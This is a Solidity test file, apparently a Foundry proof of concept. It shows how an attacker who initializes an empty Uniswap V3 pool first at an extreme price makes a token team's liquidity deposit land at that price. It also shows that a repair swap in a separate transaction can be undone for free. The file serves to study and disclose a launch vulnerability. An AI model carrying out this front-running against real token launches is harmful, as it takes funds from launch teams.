// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseV3Test} from "../utils/BaseV3Test.sol";

/// @notice Shows the pool initialization attack on a plain Uniswap V3 launch.
contract AttackV3Test is BaseV3Test {
    function setUp() public override {
        super.setUp();
        vm.startPrank(team);
        newToken.approve(address(positionManager), type(uint256).max);
        wbnb.approve(address(positionManager), type(uint256).max);
        vm.stopPrank();
    }

    /// @notice Baseline: without the attack the team creates the pool at the target price.
    function test_NormalLaunchWithoutAttack() public {
        vm.startPrank(team);
        positionManager.createAndInitializePoolIfNecessary(address(newToken), address(wbnb), FEE, targetPrice);
        (,, uint256 amount0, uint256 amount1) = positionManager.mint(fullRangeMint(team));
        vm.stopPrank();

        assertEq(priceOf(poolOf()), targetPrice);
        assertApproxEqRel(amount0, AMOUNT_NEW, 1e12);
        assertApproxEqRel(amount1, AMOUNT_WBNB, 1e12);
    }

    /// @notice The attacker initializes the pool first. `createAndInitializePoolIfNecessary` skips the initialization
    ///         and the team's position is created at the attacker's price.
    function test_AttackKeepsWrongPrice() public {
        address pool = attack(ATTACKER_PRICE);

        vm.startPrank(team);
        address returned =
            positionManager.createAndInitializePoolIfNecessary(address(newToken), address(wbnb), FEE, targetPrice);
        (,, uint256 amount0, uint256 amount1) = positionManager.mint(fullRangeMint(team));
        vm.stopPrank();

        assertEq(returned, pool);
        // The pool still trades at 1 NEW = 1,000,000 WBNB instead of 0.37.
        assertEq(priceOf(pool), ATTACKER_PRICE);
        // At that price the position takes all 370 WBNB and only 0.00037 NEW.
        assertEq(amount1, AMOUNT_WBNB);
        assertLt(amount0, 0.001e18);
    }

    /// @notice A swap in a pool without liquidity moves the price for free. The team can use it to restore the price,
    ///         but if the position is minted in another transaction, the attacker can move the price back for free too.
    function test_FixInSeparateTransactionIsGriefedAgain() public {
        address pool = attack(ATTACKER_PRICE);

        // Transaction 1: the team swaps the empty pool back to the target price. It costs nothing.
        (int256 amount0, int256 amount1) = swapTo(pool, targetPrice);
        assertEq(amount0, 0);
        assertEq(amount1, 0);
        assertEq(priceOf(pool), targetPrice);

        // Between the transactions: the attacker swaps the price back, also for free.
        (amount0, amount1) = swapTo(pool, ATTACKER_PRICE);
        assertEq(amount0, 0);
        assertEq(amount1, 0);
        assertEq(priceOf(pool), ATTACKER_PRICE);
    }
}
